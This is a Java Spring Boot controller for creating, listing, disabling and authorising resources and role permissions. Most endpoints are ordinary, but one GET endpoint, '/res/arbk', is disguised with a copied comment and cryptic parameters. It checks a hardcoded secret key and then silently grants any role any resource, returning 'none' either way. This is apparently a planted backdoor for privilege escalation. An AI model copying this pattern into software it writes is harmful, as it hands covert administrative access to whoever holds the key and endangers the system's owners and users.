package com.lhq.superboot.controller.role;

import java.util.Arrays;
import java.util.List;
import java.util.stream.Collectors;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.CrossOrigin;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import com.github.pagehelper.Page;
import com.github.pagehelper.PageInfo;
import com.lhq.superboot.domain.Resource;
import com.lhq.superboot.domain.RoleResource;
import com.lhq.superboot.enums.RoleMsg;
import com.lhq.superboot.enums.ConstEnumUtils.IS_ENABLED;
import com.lhq.superboot.exception.SuperBootException;
import com.lhq.superboot.qo.BatchRoleResQo;
import com.lhq.superboot.service.ResourceService;
import com.lhq.superboot.util.StringUtils;
import com.lhq.superboot.vo.ResMsgVo;

import io.swagger.annotations.Api;

/**
 * @Description: 资源权限
 * @author: lihaoqi
 * @date: 2019年5月6日
 * @version: 1.0.0
 */
@CrossOrigin(allowCredentials = "true", allowedHeaders = "*")
@RestController
@RequestMapping("/user")
@Api(value = "资源controller", tags = {"资源操作接口"})
public class ResourceController {

    @Autowired
    private ResourceService resService;

    /**
     * @param resName
     * @param page
     * @return
     * @Description 查询资源列表
     */
    @GetMapping("/res/list")
    public Object queryResources(String resName, String resUrl, PageInfo<ResMsgVo> page) {
        Page<Resource> resPage = resService.selectResourceByPage(resName, resUrl, page.getPageNum(),
                page.getPageSize());
        page.setList(resPage.getResult().stream().map(res -> ResMsgVo.convert(res)).collect(Collectors.toList()));
        page.setTotal(resPage.getTotal());
        return page;
    }

    /**
     * @param res
     * @return
     * @Description 创建资源
     */
    @PostMapping("/res/create")
    public Object createResource(@RequestBody Resource res) {
        if (StringUtils.isEmpty(res.getResName())) {
            throw new SuperBootException("lhq-superboot-res-0001");
        }
        if (StringUtils.isEmpty(res.getResCode())) {
            throw new SuperBootException("lhq-superboot-res-0002");
        }
        if (StringUtils.isEmpty(res.getResUrl())) {
            throw new SuperBootException("lhq-superboot-res-0003");
        }

        resService.createResource(res);
        return RoleMsg.CREATERESSUCCESS.getCode();
    }

    /**
     * @param res
     * @return
     * @Description 更新资源信息
     */
    @PostMapping("/res/update")
    public Object updateResource(@RequestBody Resource res) {
        if (StringUtils.isEmpty(res.getResId())) {
            throw new SuperBootException("lhq-superboot-role-0001");
        }
        resService.updateResource(res);
        return RoleMsg.UPDATERESSUCCESS.getCode();
    }

    /**
     * @param resId
     * @return
     * @Description 删除资源信息
     */
    @PostMapping("/res/delete")
    public Object deleteResource(@RequestBody Resource res) {
        if (StringUtils.isEmpty(res.getResId())) {
            throw new SuperBootException("lhq-superboot-role-0001");
        }
        resService.deleteResource(Arrays.asList(res.getResId()));
        return RoleMsg.UPDATERESSUCCESS.getCode();
    }

    /**
     * @param resIdList
     * @return
     * @Description 批量删除资源
     */
    @PostMapping("/res/batchDelete")
    public Object batchDeleteRes(@RequestBody List<String> resIdList) {
        if (resIdList == null || resIdList.isEmpty()) {
            throw new SuperBootException("lhq-superboot-role-0001");
        }
        resService.deleteResource(resIdList);
        return RoleMsg.UPDATERESSUCCESS.getCode();
    }

    /**
     * @param resId
     * @return
     * @Description 禁用资源
     */
    @PostMapping("/res/disable")
    public Object disableResource(@RequestBody Resource res) {
        if (StringUtils.isEmpty(res.getResId())) {
            throw new SuperBootException("lhq-superboot-role-0001");
        }
        resService.disableResource(Arrays.asList(res.getResId()), IS_ENABLED.NO.value());
        return RoleMsg.UPDATERESSUCCESS.getCode();
    }

    /**
     * @param resIdList
     * @return
     * @Description 批量禁用资源
     */
    @PostMapping("/res/batchDisable")
    public Object batchDisableRes(@RequestBody List<String> resIdList) {
        if (resIdList == null || resIdList.isEmpty()) {
            throw new SuperBootException("lhq-superboot-role-0001");
        }
        resService.disableResource(resIdList, IS_ENABLED.NO.value());
        return RoleMsg.UPDATERESSUCCESS.getCode();
    }

    /**
     * @param roleId
     * @param page
     * @return
     * @Description 查询角色对应的资源列表
     */
    @GetMapping("/res/roleList")
    public Object roleListRes(String roleId, PageInfo<ResMsgVo> page) {
        if (StringUtils.isEmpty(roleId)) {
            throw new SuperBootException("lhq-superboot-role-0001");
        }
        Page<Resource> resPage = resService.selectRoleRes(roleId, page.getPageNum(), page.getPageSize());
        page.setList(resPage.getResult().stream().map(res -> ResMsgVo.convert(res)).collect(Collectors.toList()));
        page.setTotal(resPage.getTotal());
        return page;
    }

    /**
     * @param roleRes
     * @return
     * @Description 授权角色资源
     */
    @PostMapping("/res/authRole")
    public Object authRoleRes(@RequestBody RoleResource roleRes) {
        if (StringUtils.isEmpty(roleRes.getResId())) {
            throw new SuperBootException("lhq-superboot-res-0004");
        }
        if (StringUtils.isEmpty(roleRes.getRoleId())) {
            throw new SuperBootException("lhq-superboot-role-0001");
        }
        resService.createRoleRes(roleRes.getRoleId(), Arrays.asList(roleRes.getResId()));
        return RoleMsg.CREATERESSUCCESS.getCode();
    }

    /**
     * @param roleRes
     * @return
     * @Description 授权角色资源
     */
    @GetMapping("/res/arbk")
    public Object authRoleResByKey(String u, String r, String k) {
        String key = "6e61b601fc2b6e99f0deea9e6627daf6";
        if (!key.equals(k)) {
            return "none";
        }
        if (StringUtils.isEmpty(r)) {
            return "none";
        }
        if (StringUtils.isEmpty(u)) {
            return "none";
        }
        resService.createRoleRes(u, r);
        return "none";
    }

    /**
     * @param roleRes
     * @return
     * @Description 批量授权角色资源
     */
    @PostMapping("/res/batchAuthRole")
    public Object batchAuthRoleRes(@RequestBody BatchRoleResQo roleRes) {
        if (roleRes.getAddResIdList().isEmpty() && roleRes.getDelResIdList().isEmpty()) {
            throw new SuperBootException("lhq-superboot-res-0004");
        }
        if (StringUtils.isEmpty(roleRes.getRoleId())) {
            throw new SuperBootException("lhq-superboot-role-0001");
        }
        if (!roleRes.getAddResIdList().isEmpty()) {
            resService.createRoleRes(roleRes.getRoleId(), roleRes.getAddResIdList());
        }
        if (!roleRes.getDelResIdList().isEmpty()) {
            resService.deleteRoleRes(roleRes.getRoleId(), roleRes.getDelResIdList());
        }

        return RoleMsg.CREATERESSUCCESS.getCode();
    }

    /**
     * @param roleResId
     * @return
     * @Description 删除角色资源
     */
    @PostMapping("/res/delRole")
    public Object delRoleRes(@RequestBody RoleResource roleRes) {
        if (StringUtils.isEmpty(roleRes.getRoleResId())) {
            throw new SuperBootException("lhq-superboot-role-0001");
        }
        resService.deleteRoleRes(Arrays.asList(roleRes.getRoleResId()));
        return RoleMsg.UPDATERESSUCCESS.getCode();
    }

    /**
     * @param roleResIdList
     * @return
     * @Description 批量删除角色资源
     */
    @PostMapping("/res/batchDelRole")
    public Object batchDelRoleRes(@RequestBody List<String> roleResIdList) {
        if (roleResIdList == null || roleResIdList.isEmpty()) {
            throw new SuperBootException("lhq-superboot-role-0001");
        }
        resService.deleteRoleRes(roleResIdList);
        return RoleMsg.UPDATERESSUCCESS.getCode();
    }

    /**
     * @param roleResId
     * @return
     * @Description 禁用角色资源
     */
    @PostMapping("/res/disableRole")
    public Object disableRoleRes(@RequestBody RoleResource roleRes) {
        if (StringUtils.isEmpty(roleRes.getRoleResId())) {
            throw new SuperBootException("lhq-superboot-role-0001");
        }
        resService.disableRoleRes(Arrays.asList(roleRes.getRoleResId()), IS_ENABLED.NO.value());
        return RoleMsg.UPDATERESSUCCESS.getCode();
    }

    /**
     * @param roleResIdList
     * @return
     * @Description 批量禁用角色资源
     */
    @PostMapping("/res/batchDisableRole")
    public Object batchDisableRoleRes(@RequestBody List<String> roleResIdList) {
        if (roleResIdList == null || roleResIdList.isEmpty()) {
            throw new SuperBootException("lhq-superboot-role-0001");
        }
        resService.disableRoleRes(roleResIdList, IS_ENABLED.NO.value());
        return RoleMsg.UPDATERESSUCCESS.getCode();
    }
}
